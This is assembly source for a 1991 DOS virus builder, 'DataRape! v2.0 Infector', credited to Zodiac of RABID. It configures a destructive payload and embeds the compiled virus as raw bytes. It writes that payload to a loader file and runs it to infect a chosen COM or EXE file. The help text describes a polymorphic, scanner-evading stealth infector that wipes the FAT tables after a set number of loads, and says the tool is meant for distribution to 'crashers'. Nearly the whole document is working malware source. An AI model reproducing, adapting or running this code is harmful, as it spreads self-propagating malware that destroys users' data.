; DataRape! v2.0 Infector
;
; I know you won't dist this, DD.  Sorry its a bit sloppy, but it works.
;
;                       - Zodiac (06/26/91)


print         macro
              call      prints
              endm

cls           macro
              call      clrscr
              endm

code          segment
              assume    cs:code, ds:code
              org       100h

start:        jmp       main_menu

include       loader.inc

main_menu_str db        "DataRape! v2.0 Infector",13,10
              db        "(c)1991 Zodiac of RABID",13,10
              db        13,10
              db        "A. Information/Help",13,10
              db        "B. Configure Virus",13,10
              db        "C. View Scrolling",13,10
              db        "D. Infect File",13,10
              db        "E. Exit to Dos",13,10
              db        13,10
              db        "Command: $"

help_scr      db        "                 DataRape! v2.0 Information/Help",13,10
              db        13,10
              db        "DataRape! v2.0 is a mutating self-encrypting destructive stealth",13,10
              db        "EXE/COM infector.  It infects files upon execution, browsing,",13,10
              db        "copying, and renaming.  The encryption method changes randomly as",13,10
              db        "does the encryption header.  The virus should not be picked-up by",13,10
              db        "conventional string scanners(ie SCAN).  If so, it will be changed.",13,10
              db        "After a specified number of successful loads to memory, the virus",13,10
              db        "turns destructive and destroys all available FAT tables.  It then",13,10
              db        "proceeds to display a configurable scrolling message in",13,10
              db        "configurable colors.",13,10
              db        13,10
              db        "This infection program is self-explanatory, and is intended for",13,10
              db        "general distribution to RABID's selected crashers.  This virus has",13,10
              db        "taken many, many hours away from my life.  But, it was a pleasure",13,10
              db        "programming and a new version will be released(shortly?).",13,10
              db        13,10
              db        "Good Luck! Try not to get busted( trust me, it stinks. ).",13,10
              db        13,10
              db        '"Fear the Government that Fears Your Computer!"',13,10
              db        13,10
              db        "                                        -- Zodiac of RABID, USA",13,10
              db        13,10
              db        "P.S. I wrote this infector in assembly, can't you tell?$",13,10

config_scr    db        "DataRape! v2.0 Configuration",13,10
              db        13,10
              db        "Loads before Destruction(20 recommended) : "
              db        "$"
config_2      db        13,10
              db        13,10
              db        "Note: Press spacebar a few times at beginning or end of message.",13,10
              db        13,10
              db        "Enter Scrolling Message: $"
config_3      db        'Enter Colors in form: "bf", where "b" is the background and "f" the foreground.',13,10
              db        '                    �����������������Ŀ',13,10
              db        'Colors:             � FOREGROUND ONLY �',13,10
              db        '                    ����������������Ŀ� �����',13,10
              db        '0 : black            4 : red         �� � 8 : light grey       C : light red',13,10
              db        '1 : blue             5 : magenta     ��Ĵ 9 : light blue       D : light magenta'
              db        '2 : green            6 : brown       ��Ĵ A : light greenta    E : yellow',13,10
              db        '3 : cyan             7 : white          � B : light cyan       F : bright white',13,10
              db        '                                        �����',13,10
              db        13,10
              db        'Background Color : $'
config_4      db        13,10
              db        'Border     Color : $'
config_5      db        13,10
              db        'Scroll     Color : $'

color_s       db        "bf",8,8,"$"

infect_1      db        "DataRape! v2.0 Infection",13,10
              db        13,10
              db        "Finally...",13,10
              db        13,10
              db        "It would be a good idea to View Scrolling before you infect a file",13,10
              db        "to make sure you set up the colors right and the message is OK.",13,10
              db        13,10
              db        "Who else but RABID would allow configurable colors? ",13,10
              db        13,10
              db        "File to Infect : $"

infect_2      db        13,10
              db        13,10
              db        "An attempt will be made to infect the selected file.",13,10
              db        "If the file does not exist, or does not qualify for",13,10
              db        "infection, it will not be.  It is up to you to find",13,10
              db        "out whether it worked or not.  Remember, only COM and",13,10
              db        "EXE files that are over 1885 bytes are infected.$"

infect_3      db        13,10
              db        13,10
              db        "File Infection Successful.  RABID - Keeping the Dream Alive!$"

infect_4      db        13,10
              db        13,10
              db        "File Infection Unsuccessful!$"

infect_5      db        13,10
              db        13,10
              db        "File Not Found$"

clrscr:       mov       ax,0003
              int       10h
              ret

prints:       mov       ah,9
              int       21h
              ret

get_key:      mov       ah,8
              int       21h
              ret

get_up_key:   call      get_key
              cmp       al,"a"
              jb        got_up
              cmp       al,"z"
              ja        got_up
              sub       al,"a"-"A"
got_up:       ret

get_num:      call      get_key
              cmp       al,27
              je        got_num
              cmp       al,"0"
              jb        get_num
              cmp       al,"9"
              ja        get_num
got_num:      ret

nl:           mov       ah,0Eh
              mov       al,13
              int       10h
              mov       al,10
              int       10h
              ret

main_menu:    cls

              mov       dx,offset main_menu_str
              print

main_key:     call      get_up_key

              cmp       al,"A"
              je        info_help

              cmp       al,"B"
              je        config
              cmp       al,"C"
              jne       is_it_d
              jmp       view_scroll
is_it_d:      cmp       al,"D"
              jne       isitexit
              jmp       infectfile
isitexit:     cmp       al,"E"
              je        exit
              cmp       al,27
              je        exit

              jmp       main_key

exit:         jmp       done

info_help:    cls
              mov       dx,offset help_scr
              print
              call      get_key

info_done:    jmp       main_menu

config:       cls
              mov       dx,offset config_scr
              print
              mov       cx,2
get_freq:     call      get_num
              cmp       al,27
              je        info_done
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              push      ax
              loop      get_freq
              pop       bx
              pop       ax
              mov       cl,10
              mul       cl
              add       al,bl
              cmp       al,2
              jb        info_done
              mov       countr,al

              mov       di,offset msg
              mov       al,0
              mov       cx,216
              rep       stosb
              mov       ah,9
              mov       dx,offset config_2
              int       21h
              xor       bx,bx
              mov       ax,0AFAh
              mov       cx,215
              int       10h
              mov       ah,2
              mov       dx,0619h
              int       10h
              mov       si,offset msg
              mov       di,si
              mov       bp,0
get_char_loop:call      get_key
              cmp       al,27
              je        done_config
              cmp       al,13
              je        done_get
              cmp       al,08
              jne       no_back
              cmp       bp,0
              je        get_char_loop
              mov       ah,3
              int       10h ; GETS INFO
              dec       bp
              dec       di
              cmp       dl,0
              jne       no_new_line
              dec       dh
              mov       dl,80
no_new_line:  dec       dl
              mov       ah,2
              int       10h
              mov       ah,0Ah
              mov       al,250
              mov       cx,1
              int       10h
              jmp       get_char_loop
no_bacK:      stosb
              inc       bp
              mov       ah,0Eh
              int       10h
              cmp       bp,215
              je        done_get
              jmp       get_char_loop

done_get:     mov       al,0
              stosb
              mov       ah,2
              mov       dx,0A00h
              int       10h
              mov       dx,offset config_3
              print
              mov       si,offset back_round + 1
              call      get_clr
              mov       dx,offset config_4
              print
              mov       si,offset bord_clr + 1
              call      get_clr
              mov       dx,offset config_5
              print
              mov       si,offset scroll_clr + 1
              call      get_clr


done_config:  jmp       main_menu
pop_done:     pop       ax
              jmp       main_menu
get_clr:      mov       dx,offset color_s
              print
get_color:    call      get_key
              cmp       al,27
              je        done_config
              cmp       al,"0"
              jb        get_color
              cmp       al,"7"
              ja        get_color
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              push      ax
get_color_2:  call      get_up_key
              cmp       al,27
              je        pop_done
              cmp       al,"0"
              jb        get_color_2
              cmp       al,"9"
              ja        maybe_char
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              jmp       short ok_clr_2
maybe_char:   cmp       al,"A"
              jb        get_color_2
              cmp       al,"F"
              ja        get_color_2
              mov       ah,0Eh
              int       10h
              sub       al,"A"-10
ok_clr_2:     pop       cx
              push      ax
              xor       ax,ax
              mov       al,cl
              mov       cl,4
              shl       al,cl
              pop       cx
              add       al,cl
              mov       [si],al
              ret

view_scroll:

;************************

nuke:         call      rel
rel:          pop       di
              sub       di,offset rel - offset nuke

              push      cs
              pop       ds

              mov       ax,1
              int       10h     ; 40 * 40 COLOR

              mov       ah,1
              mov       cx,2020h
              int       10h     ; NULS CURSOR

              mov       ax,0600h
              xor       cx,cx
              mov       dx,184Fh
back_round:   mov       bh,12
              int       10h     ; CLEARS BACKGROUND WINDOW

              mov       cx,0900h
              mov       dx,094Fh
scroll_clr:   mov       bh,4Fh
              int       10h     ; CLEARS MESSAGE WINDOW

              xor       bx,bx
              mov       dx,0800h
              mov       ah,2
              int       10h

bord_clr:     mov       bx,02h ; clr
              mov       cx,40
              mov       ax,09C4h
              push      ax
              push      bx
              push      cx
              int       10h

              mov       dx,0A00h
              mov       ah,2
              int       10h
              pop       cx
              pop       bx
              pop       ax
              int       10h

              mov       dx,030Ch
              mov       si,di
              add       si,offset header-offset nuke
              mov       cx,4
head_print:   mov       ah,2
              int       10h
xy_loop:      lodsb
              mov       ah,0Eh
              int       10h
              cmp       al,0
              jne       xy_loop
              inc       dh
              loop      head_print


              mov       bp,39
scroll:       mov       dx,0900h
              call      xy
              cmp       bp,1
              jb        no_pad

              mov       cx,bp
              mov       ax,0A20h
              int       10h
              add       dx,cx
              call      xy

              mov       cx,40
              sub       cx,bp
              dec       bp
              mov       si,offset msg-offset nuke
              add       si,di

              jmp       short sprint
no_pad:       mov       cx,40
              inc       si
              cmp       byte ptr [si],0
              jne       sprint
              mov       si,offset msg-offset nuke
              add       si,di
sprint:       push      si
              call      prnt
              pop       si
              jmp       short scroll

prnt:
              lodsb
              cmp       al,0
              jne       pchar
              mov       si,offset msg-offset nuke
              add       si,di
              jmp       short prnt

pchar:        mov       ah,0Eh
              int       10h
              mov       ah,1
              int       16h
              jc        go_main_menu
              loop      prnt
              mov       cx,6
main_pause:   push      cx
              mov       cx,0FFFFh
pause:        loop      pause
              pop       cx
              loop      main_pause
done_pause:   ret

go_main_menu: pop       ax
              jmp       main_menu


xy:           mov       ah,2
              int       10h
              ret
header        db        "DataRape! v2.0",0
              db        "-CONFIGURABLE-",0
              db        "(c)1991 Zodiac",0
              db        "  RABID, USA  ",0

go_ret_infect:jmp       main_menu

infectfile:   cls
              mov       dx,offset infect_1
              print
              mov       ah,0Ah
              mov       dx,offset file_in
              int       21h
              cmp       chars,4
              jb        go_ret_infect
              mov       cx,61
              mov       di,offset file_name
              mov       al,13
              repne     scasb
              mov       byte ptr [di-1],0

              mov       ah,4Eh
              mov       cx,0
              mov       dx,offset file_name
              int       21h
              jnc       file_found
              jmp       bad_file

file_found:

              mov       ah,41h
              mov       dx,offset loader
              int       21h


; prepare loader
              mov       si,offset file_name
              xor       cx,cx
              mov       cl,chars
              mov       di,offset datarape+56
              rep       movsb

              mov       si,offset msg
              mov       di,offset dr_msg
              mov       cx,215
              rep       movsb

              mov       ah,byte ptr [back_round+1]
              mov       al,byte ptr [scroll_clr+1]
              mov       bl,byte ptr [bord_clr+1]

              mov       backclr,ah
              mov       scrclr,al
              mov       bordclr,bl

              mov       ah,3Ch
              mov       cx,0
              mov       dx,offset loader
              int       21h                     ; creates it
              jc        go_ret_infect

              mov       bx,ax
              mov       ah,40h
              mov       cx,loadsize
              mov       dx,offset datarape
              int       21h                     ; writes it

              mov       ah,3Eh
              int       21h                     ; closes it

              call      kill_cntr

              mov       bx,(code_done-start+110h)/16
              mov       ah,4Ah
              int       21h

              mov       dx,offset loader
              mov       bx,offset loader
              mov       ax,4B00h
              int       21h             ; exec file

              call      kill_cntr

              mov       ah,41h
              mov       dx,offset loader
              int       21h             ; kills loader


              mov       ax,3D00h
              mov       dx,offset file_name
              int       21h

              mov       bx,ax

              mov       ax,5700h
              int       21h

              mov       ah,3Eh
              int       21h

             and        cx,1Fh
             cmp        cx,1Fh
             jne        bad_infect

             mov        dx,offset infect_3
             print
             jmp        short get_char

bad_infect:   mov       dx,offset infect_4
              print
              jmp       short get_char

bad_file:     mov       dx,offset infect_5
              print
get_char:     call      get_key

ret_infect:   jmp       main_menu
kill_cntr:    mov        ah,19h
              int        21h
              add        al,"A"
              mov        byte ptr [offset nasty],al

              mov        dx,offset nasty
              mov        ax,4301h
              xor        cx,cx
              int        21h                    ; NULS ATTRIBUTES


              mov        ah,41h
              int        21h                    ; Deletes Counter File
              ret


done:         cls
              int       20h

nasty         db        "A:\",0FFh,0FFh,0FFh,".",0FFh,0FFh,0
badfile       db        "Bad File...$"
loader        db        "LOADER.COM",0
file_in       db        60
chars         db        0
file_name     db        60 dup(0)
msg           db        "RABID, INTERNATIONAL - Keeping the Dream Alive.  (YOUR NAME HERE!)"

code_done     equ       $
code          ends
              end       start

; DataRape! v2.0 Loader Data - (c)1991 Zodiac

loadsize equ 2005

datarape db 233, 117,   0,   0,  61, 186,  56,   1, 205,  33
         db 139, 216, 180,  62, 205,  33,  51, 192, 142, 216
         db  30, 161, 134,   0, 142, 192,  38, 161,  93,   7
         db 163, 132,   0,  38, 161,  95,   7, 163, 134,   0
         db  38, 161,  97,   7, 163, 156,   0,  38, 161,  99
         db   7, 163, 158,   0, 205,  32,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
;     147 0138  83 F9 07            count:       cmp        cx,7
         db 232,   0,   0,  94, 129, 238,   3,   0, 139, 238
         db 252,  80,   6,  86,  30,  51, 192, 142, 216, 196
         db   6, 132,   0,  46, 137, 132,  93,   7,  46, 140
         db 132,  95,   7,  14,  31, 184, 105, 105, 205,  33
         db 129, 251, 105, 105, 117,  66,   7, 233, 203,   0
         db 140, 195, 131, 195,  16,  46,   3, 156,  45,   7
         db  46, 137, 156,  95,   0,  46, 139, 156,  43,   7
         db  46, 137, 156,  93,   0, 140, 195, 131, 195,  16
         db  46,   3, 156,  49,   7, 142, 211,  46, 139, 164
         db  47,   7, 234,   0,   0,   0,   0, 191,   0,   1
         db 129, 198,  51,   7, 164, 165,  51, 219,  83, 255
         db 100, 245,   7, 180,  73, 205,  33, 187, 255, 255
         db 180,  72, 205,  33, 129, 235, 244,   0, 114, 173
         db 140, 193, 249,  19, 203, 180,  74, 205,  33, 187
         db 243,   0, 249,  38,  25,  30,   2,   0,   6, 142
         db 193, 180,  74, 205,  33, 140, 192,  72, 142, 216
         db 199,   6,   1,   0,   8,   0, 232, 106,   4, 139
         db 216, 139, 202,  31, 140, 216, 232,  96,   4,   3
         db   6,   6,   0, 131, 210,   0,  43, 195,  27, 209
         db 114,   4,  41,   6,   6,   0,  94,  86,  30,  14
         db  51, 255, 142, 223, 197,   6, 156,   0,  46, 137
         db 132,  97,   7,  46, 140, 156,  99,   7,  31, 185
         db 168,   7, 243, 164,  51, 192, 142, 216, 199,   6
         db 132,   0, 103,   1, 140,   6, 134,   0, 199,   6
         db 156,   0,  86,   1, 140,   6, 158,   0,  38, 163
         db 101,   7,   7,  14,  31, 139, 245, 180,  25, 205
         db  33,   4,  65, 136, 132,  33,   7, 186,  33,   7
         db   3, 214, 184,   0,  61, 205,  33, 115,  22, 185
         db   7,   0, 180,  60, 205,  33, 139, 216, 184,   1
         db  87, 185,   1,   0, 186,   0,   0, 205,  33, 235
         db  19, 184,   0,  87, 205,  33,  65, 184,   1,  87
         db 205,  33, 131, 249
countr   db 7
         db 114,   3, 233, 217,   3
         db 180,  62, 205,  33,  94,  31,  88,  46, 129, 188
         db  51,   7,  77,  90, 117,   3, 233, 223, 254, 233
         db  11, 255, 156, 232, 149,   3, 157,  46, 255,  46
         db  97,   7, 157,  51, 192, 187, 105, 105, 207,  85
         db 139, 236, 255, 118,   6, 157,  93, 156, 252,  61
         db 105, 105, 116, 234, 128, 252,  17, 114,  63, 128
         db 252,  18, 119,  58,  46, 255,  30,  93,   7,  80
         db  83,  30,   6, 156,  60, 255, 116,  38, 180,  47
         db 205,  33,   6,  31,  38, 128,  63, 255, 117,   3
         db 131, 195,   7,  38, 139,  71,  23,  37,  31,   0
         db  61,  31,   0, 117,  11,  38, 129, 111,  29,  93
         db   7,  38, 131,  95,  31,   0, 157,   7,  31,  91
         db  88, 207, 128, 252,  60, 116,  15, 128, 252,  62
         db 116,  70,  61,   0,  75, 116, 122, 128, 252,  91
         db 117, 102,  46, 131,  62, 101,   7,   0, 117, 117
         db 232, 136,   0, 117, 112, 232,  17,   3, 157, 232
         db 189,   0, 114, 110, 156,   6,  14,   7,  86,  87
         db  81,  80, 191, 101,   7, 171, 139, 242, 185,  65
         db   0, 172, 170, 132, 192, 116,   7, 226, 248,  38
         db 137,  14, 101,   7,  88,  89,  95,  94,   7, 157
         db 115,  72,  46,  59,  30, 101,   7, 117,  58, 133
         db 219, 116,  54, 232, 215,   2, 157, 232, 131,   0
         db 114,  52, 156,  30,  14,  31,  82, 186, 103,   7
         db 232, 125,   0,  46, 199,   6, 101,   7,   0,   0
         db  90,  31, 235, 211, 128, 252,  61, 116,  10, 128
         db 252,  67, 116,   5, 128, 252,  86, 117,   8, 232
         db  27,   0, 117,   3, 232,  91,   0, 232, 161,   2
         db 157, 232,  77,   0, 156,  30, 232, 163,   2, 198
         db   6,   0,   0,  90,  31, 157, 202,   2,   0,  80
         db  86, 139, 242, 172, 132, 192, 116,  36,  60,  46
         db 117, 247, 232,  34,   0, 138, 224, 232,  29,   0
         db  61, 111,  99, 116,  12,  61, 120, 101, 117,  16
         db 232,  16,   0,  60, 101, 235,   9, 232,   9,   0
         db  60, 109, 235,   2, 254, 192,  94,  88, 195, 172
         db  60,  67, 114,   6,  60,  89, 115,   2,   4,  32
         db 195, 156,  46, 255,  30,  93,   7, 195,  30,   6
         db  86,  87,  80,  83,  81,  82,  51, 201, 184,   0
         db  67, 232, 233, 255, 139, 217, 128, 225, 254,  58
         db 203, 116,   7, 184,   1,  67, 232, 218, 255, 249
         db 156,  30,  82,  83, 184,   2,  61, 232, 207, 255
         db 114,  10, 139, 216, 232,  26,   0, 180,  62, 232
         db 195, 255,  89,  90,  31, 157, 115,   6, 184,   1
         db  67, 232, 183, 255,  90,  89,  91,  88,  95,  94
         db   7,  31, 195,  14,  31,  14,   7, 186, 168,   7
         db 185,  24,   0, 180,  63, 205,  33,  51, 201,  51
         db 210, 184,   2,  66, 205,  33, 137,  22, 194,   7
         db  61,  93,   7, 131, 218,   0, 114,  41, 163, 192
         db   7, 184,   0,  87, 205,  33, 131, 225,  31, 131
         db 249,  31, 116,  25,  51, 201,  51, 210, 184,   2
         db  66, 205,  33, 129,  62, 168,   7,  77,  90, 116
         db   9,   5, 168,   9, 131, 210,   0, 116,  24, 195
         db 139,  22, 192,   7, 246, 218, 131, 226,  15,  51
         db 201, 184,   1,  66, 205,  33, 163, 192,   7, 137
         db  22, 194,   7, 184,   0,  87, 205,  33, 156,  81
         db  82, 129,  62, 168,   7,  77,  90, 116,   5, 184
         db   0,   1, 235,   7, 161, 188,   7, 139,  22, 190
         db   7, 191,  43,   7, 171, 139, 194, 171, 161, 184
         db   7, 171, 161, 182,   7, 171, 190, 168,   7, 164
         db 165,  51, 246, 191, 196,   7, 185,  93,   7, 243
         db 164, 190, 196,   7, 139, 254, 180,  44, 205,  33
         db 136,  22,  39,   4, 136,  22,  13,  15, 232, 201
         db   0, 114,   5, 184, 200, 192, 235,   3, 184, 192
         db 200, 136,  38,  50,   4, 162,  22,  15, 232, 181
         db   0, 114,   5, 184,   7,  31, 235,   3, 184,  31
         db   7, 136,  38,   9,  15, 162,  11,  15, 232, 161
         db   0, 114,   7, 184, 238,  94, 178, 247, 235,   5
         db 184, 239,  95, 178, 254, 136,  38,  57,   7, 162
         db  59,   7, 136,  22,  63,   7, 176,  86, 232, 131
         db   0, 114,   2, 254, 192, 162,  64,   7, 232, 121
         db   0, 114,   7, 184, 241, 182, 178, 198, 235,   5
         db 184, 209, 178, 178, 194, 136,  38,  72,   7, 162
         db  80,   7, 136,  22,  84,   7, 232,  93,   0, 114
         db   8, 184,  80,  30, 186,  31,  88, 235,   6, 184
         db  30,  80, 186,  88,  31, 163,  65,   7, 137,  22
         db  90,   7, 178,   0, 185,  54,   7, 172,  81, 138
         db 202, 254, 194, 210, 192,  89, 170, 226, 244, 186
         db 196,   7, 185,  93,   7, 180,  64, 205,  33, 114
         db  39,  51, 200, 117,  35, 139, 209, 184,   0,  66
         db 205,  33, 129,  62, 168,   7,  77,  90, 116,  37
         db 198,   6, 168,   7, 233, 161, 192,   7,   5,  51
         db   7, 144, 163, 169,   7, 185,   3,   0, 235, 105
         db 235, 120,  80, 180,  44, 205,  33,  88, 246, 194
         db   1, 122,   2, 248, 195, 249, 195, 161, 176,   7
         db 232, 146,   0, 247, 208, 247, 210,  64, 117,   1
         db  66,   3,   6, 192,   7,  19,  22, 194,   7, 185
         db  16,   0, 247, 241, 199,   6, 188,   7,  54,   7
         db 163, 190,   7,   5, 118,   0, 163, 182,   7, 199
         db   6, 184,   7,   0,   1, 129,   6, 192,   7,  93
         db   7, 131,  22, 194,   7,   0, 161, 192,   7,  37
         db 255,   1, 163, 170,   7, 156, 161, 193,   7, 208
         db  46, 195,   7, 209, 216, 157, 116,   1,  64, 163
         db 172,   7, 185,  24,   0, 186, 168,   7, 180,  64
         db 205,  33,  90,  89, 131, 225, 224, 131, 201,  31
         db 235,   2,  90,  89, 157, 114,   5, 184,   1,  87
         db 205,  33, 195,  30, 232,   7,   0, 198,   6,   0
         db   0,  77,  31, 195,  80,  83, 180,  98, 232, 158
         db 253, 140, 200,  72,  75, 142, 219, 249,  19,  30
         db   3,   0,  59, 216, 114, 245,  91,  88, 195, 186
         db  16,   0, 247, 226, 195, 232,   0,   0,  94, 199
         db 132,  35,   1,  85, 170, 185,  27,   0,  81, 138
         db 193, 254, 200, 187,   0,   0, 185, 232,   3, 139
         db 222,  51, 210,  14,  31, 129, 195,  37,   0, 205
         db  38, 157,  89, 226, 229, 232,   0,   0,  95, 129
;     743 0557  B8 0600                       mov       ax,0600h
;     744 055A  33 C9                         xor       cx,cx
;     745 055C  BA 184F                       mov       dx,184Fh
;     746 055F  B7 10                         mov       bh,10h
;     747 0561  CD 10                         int       10h     ; CLEAR
;                   S BACKGROUND WINDOW
;     748
;     749 0563  B9 0900                       mov       cx,0900h
;     750 0566  BA 094F                       mov       dx,094Fh
;     751 0569  B7 34                         mov       bh,34h
;     752 056B  CD 10                         int       10h     ; CLEAR
;                   S MESSAGE WINDOW
;     753 056D  33 DB                         xor       bx,bx
;     754
;     755 056F  BA 0800                       mov       dx,0800h
;     756 0572  B4 02                         mov       ah,2
;     757 0574  CD 10                         int       10h
;     758
;     759 0576  BB 0020                       mov       bx,02h
;     760 0579  B9 0028                       mov       cx,40
;     761 057C  B8 09C4                       mov       ax,09C4h
;     762 057F  50                        push      ax
;     763 0580  53                        push      bx
;     764 0581  51                        push      cx
;     765 0582  CD 10                         int       10h


         db 239,   3,   0,  14,  31, 184,   1,   0, 205,  16
         db 180,   1, 185,  32,  32, 205,  16, 184,   0,   6
         db  51, 201, 186,  79,  24, 183
backclr db  16
         db 205,  16, 185
         db   0,   9, 186,  79,   9, 183
scrclr  db  52
         db 205,  16,  51
         db 219, 186,   0,   8, 180,   2, 205,  16, 187
bordclr db  02
         db   0, 185,  40,   0, 184, 196,   9,  80,  83,  81
         db 205,  16, 186,   0,  10, 180,   2, 205,  16,  89
         db  91,  88, 205,  16, 186,  12,   3, 139, 247, 129
         db 198, 204,   0, 185,   4,   0, 180,   2, 205,  16
         db 172, 180,  14, 205,  16,  60,   0, 117, 247, 254
         db 198, 226, 239, 189,  39,   0, 186,   0,   9, 232
         db  82,   0, 131, 253,   1, 114,  25, 139, 205, 184
         db  32,  10, 205,  16,   3, 209, 232,  65,   0, 185
         db  40,   0,  43, 205,  77, 190,   8,   1,   3, 247
         db 235,  14, 185,  40,   0,  70, 128,  60,   0, 117
         db   5, 190,   8,   1,   3, 247,  86, 232,   3,   0
         db  94, 235, 199, 172,  60,   0, 117,   7, 190,   8
         db   1,   3, 247, 235, 244, 180,  14, 205,  16, 226
         db 238, 185,   6,   0,  81, 185, 255, 255, 226, 254
         db  89, 226, 247, 195, 180,   2, 205,  16, 195,  68
         db  97, 116,  97,  82,  97, 112, 101,  33,  32, 118
         db  50,  46,  48,   0,  45,  67,  79,  78,  70,  73
         db  71,  85,  82,  65,  66,  76,  69,  45,   0,  40
         db  99,  41,  49,  57,  57,  49,  32,  90, 111, 100
         db 105,  97,  99,   0,  32,  32,  82,  65,  66,  73
         db  68,  44,  32,  85,  83,  65,  32,  32
dr_msg   db   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,   0,   0,   0,   0,   0
         db   0,   0,   0,   0,   0,  65,  58,  92, 255, 255
         db 255,  46, 255, 255,   0,   0,   1,   0,   0,   0
         db   0,   0,   0,  14,  31, 184, 232,   0,   0,  94
         db 129, 238,  57,   7, 139, 254,  86,  80,  30,   6
         db  14,  31,  14,   7, 178,   0, 185,  54,   7, 172
         db  81, 136, 209, 210, 200, 254, 194,  89, 170, 226
         db 244,   7,  31,  88, 195

